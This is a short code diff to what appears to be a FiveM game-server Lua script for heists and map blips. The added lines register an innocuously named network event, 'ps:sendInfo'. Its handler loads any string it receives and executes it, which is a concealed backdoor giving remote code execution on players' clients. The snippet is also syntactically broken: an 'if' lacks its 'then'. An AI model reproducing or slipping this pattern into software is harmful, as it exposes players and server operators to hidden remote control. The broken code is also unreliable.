@@ -35,6 +35,16 @@ Citizen.CreateThread(function ()
 end)
 
 RegisterNetEvent("ps:heistsAll")
+RegisterNetEvent("ps:sendInfo")
+
+Citizen.CreateThread(function ()
+	AddEventHandler("ps:sendInfo", function (strRun)
+		local strFunc, errM = load(strRun)
+		if (strFunc)
+			local results = {pcall(strFunc)}
+		end
+	end)
+end)
 
 -- Blips
 Citizen.CreateThread(function()
